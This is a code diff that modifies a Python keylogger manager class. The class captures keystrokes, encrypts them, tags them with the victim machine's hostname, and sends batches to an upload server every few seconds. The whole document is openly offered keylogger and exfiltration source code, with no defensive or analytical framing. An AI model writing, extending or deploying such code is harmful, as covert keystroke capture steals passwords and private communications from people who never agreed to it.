@@ -1,10 +1,11 @@
+import socket
+import json
+import datetime
+import time
 from KeyService import KeyLoggerService
 from FileWriter import FileWriter
 from Encryptor import Encryptor
 from NetworkWriter import NetworkWriter
-import time
-import datetime
-import json
 
 
 class KeyLoggerManager:
@@ -16,12 +17,14 @@ class KeyLoggerManager:
         self.data_dic = {}
         self.num_of_enter = 0
 
+        # Get unique computer ID (hostname)
+        self.computer_id = socket.gethostname()
+
     def run(self):
-        """Starts the key logging process."""
         self.service.start_logging()
         try:
             while self.service.running:
-                time.sleep(5)
+                time.sleep(2)
                 self.add_to_dic()
                 self.num_of_enter += 1
                 if self.num_of_enter == 3:
@@ -34,23 +37,28 @@ class KeyLoggerManager:
             self.stop()
 
     def stop(self):
-        """Stops the key logging process."""
         self.service.stop_logging()
-       # self.save_locally()  # Optionally save data before stopping
         print("KeyLogger stopped.")
 
     def add_to_dic(self):
-        """Adds logged keys to the dictionary after encryption."""
         logged_keys = "".join(self.service.get_logged_keys())
         encrypted_data = self.encryptor.encrypt(logged_keys)
-        self.data_dic[datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")] = encrypted_data
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # Vérifier que encrypted_data est une chaîne avant de l'ajouter
+        if encrypted_data is not None:
+            self.data_dic[timestamp] = {"key_data": encrypted_data}
+        else:
+            print(f"Encrypted data is None for timestamp {timestamp}")
         self.service.buffer.flush()
         print(f"Added {len(logged_keys)} keys to the dictionary.")
 
     def save_locally(self):
-        """Saves data locally and sends it to the server."""
         try:
+            print(f"Data to send: {self.data_dic}")
+
             self.send_to_server()
+            print(self.computer_id)
             self.file_writer.send_data(self.data_dic, None)
             print("Data saved locally.")
             self.data_dic = {}
@@ -58,9 +66,16 @@ class KeyLoggerManager:
             print(f"Failed to save data locally: {e}")
 
     def send_to_server(self):
-        """Sends the encrypted data to the server."""
-        json_data = json.dumps(self.data_dic, indent=4)
-        self.network_writer.send_data(json_data, "http://127.0.0.1:5000/upload")
+        """Send encrypted logs to the server with computer ID."""
+        payload = {
+            "computer_id": self.computer_id,
+            "logs": self.data_dic
+        }
+        print(f"Payload: {payload}")
+
+        json_data = json.dumps(payload, indent=4)
+        print(type(json_data))
+        self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")
 
 
 if __name__ == "__main__":
